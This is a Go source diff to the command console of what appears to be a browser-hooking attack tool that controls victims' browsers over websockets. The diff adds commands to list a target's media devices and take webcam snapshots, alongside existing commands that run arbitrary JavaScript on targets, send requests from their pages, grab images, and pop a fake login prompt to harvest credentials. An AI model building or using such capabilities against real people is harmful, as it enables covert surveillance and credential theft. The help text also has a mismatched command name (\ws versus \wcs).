@@ -146,25 +146,27 @@ func New(c *config.Config) (*Shell, error) {
 
 	cmdSetTargets := &cmd{
 		desc: `set the websockets to target. one or more targets can be set with the following methods:
-	*        -targets all active websocket connections (default target set)
-	8        -target a single websocket connection belonging to that id number
-	1,2,8,10 -targets all websocket IDs in the comma separated list
-	4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
-	4-       -targets all websocket IDs that are greater than or equal to the listed number
-	-16      -targets all websocket IDs that are less than or equal to the listed number`,
+*        -targets all active websocket connections (default target set)
+8        -target a single websocket connection belonging to that id number
+1,2,8,10 -targets all websocket IDs in the comma separated list
+4-16     -targets all websocket IDs from the lowest number listed to the highest number listed
+4-       -targets all websocket IDs that are greater than or equal to the listed number
+-16      -targets all websocket IDs that are less than or equal to the listed number`,
 		usage: `\st TARGET_SET
-	examples:
-		\st *
-		\st 2
-		\st 2,4,7
-		\st 10-15
-		\st 6-
-		\st -100`,
+examples:
+    \st *
+    \st 2
+    \st 2,4,7
+    \st 10-15
+    \st 6-
+    \st -100`,
 		run: s.setTargets,
 	}
 
 	cmdSendFile := &cmd{
-		desc:  "send a javascript file to the target set and execute it. any data can be returned from the target set by calling `this.send(\"return data string\");` in the script. relative file paths are relative to the path provided to -wrkdir",
+		desc: `send a javascript file to the target set and execute it. 
+any data can be returned from the target set by calling ` + "`" + `this.send(\"return data string\");` + "`" + ` in the script. 
+relative file paths are relative to the path provided to -wrkdir`,
 		usage: `\sf FILE_PATH`,
 		run:   s.sendFile,
 	}
@@ -203,25 +205,45 @@ func New(c *config.Config) (*Shell, error) {
 	cmdXHR := &cmd{
 		desc: "send an xhr request from the target set's current page",
 		usage: `\xhr HTTP_METHOD FULL_URL [CONTENT_HEADER] [POST_BODY]
-	examples:
-		\xhr GET https://google.com/
-		\xhr POST https://google.com/ application/json {"hello": "world"}`,
+examples:
+    \xhr GET https://google.com/
+    \xhr POST https://google.com/ application/json {"hello": "world"}`,
 		run: s.xhr,
 	}
 
 	cmdGetImages := &cmd{
-		desc: "download all images on the target set's page. images will be stored in DOWNLOAD_DIR. relative file paths are relative to the path provided to -wrkdir",
+		desc: `download all images on the target set's page. 
+images will be stored in DOWNLOAD_DIR. 
+relative file paths are relative to the path provided to -wrkdir`,
 		usage: `\gi [DOWNLOAD_DIR]
-	examples:
-		\gi
-		\gi /tmp/images
-		\gi imgdir`,
+examples:
+    \gi
+    \gi /tmp/images
+    \gi imgdir`,
 		run: s.getImages,
 	}
 
 	cmdPromptForLogin := &cmd{
 		desc: "open a modal on the target set's page prompting them for a username and password",
 		run:  s.promptForLogin,
+	}
+
+	cmdEnumerateMediaDevices := &cmd{
+		desc: "return a list of media devices accessible to the target set's browser",
+		run:  s.enumerateMediaDevices,
+	}
+
+	cmdWebcamSnapshot := &cmd{
+		desc: `attempt to take a snapshot from the target set's webcam, if one is available. 
+images will be stored in DOWNLOAD_DIR. 
+relative file paths are relative to the path provided to -wrkdir.
+NOTE: using this command may prompt the target set for webcam access. 
+the target set may reject the prompt, or ignore it entirely.`,
+		usage: `\ws DOWNLOAD_DIR
+examples:
+    \wcs /tmp/webcam_snaps
+    \wcs snaps`,
+		run: s.webcamSnapshot,
 	}
 
 	//build command list
@@ -243,6 +265,8 @@ func New(c *config.Config) (*Shell, error) {
 	s.cmds[`\xhr`] = cmdXHR
 	s.cmds[`\gi`] = cmdGetImages
 	s.cmds[`\pfl`] = cmdPromptForLogin
+	s.cmds[`\emd`] = cmdEnumerateMediaDevices
+	s.cmds[`\wcs`] = cmdWebcamSnapshot
 
 	go s.drainBuffer()
 	go s.startConsole()
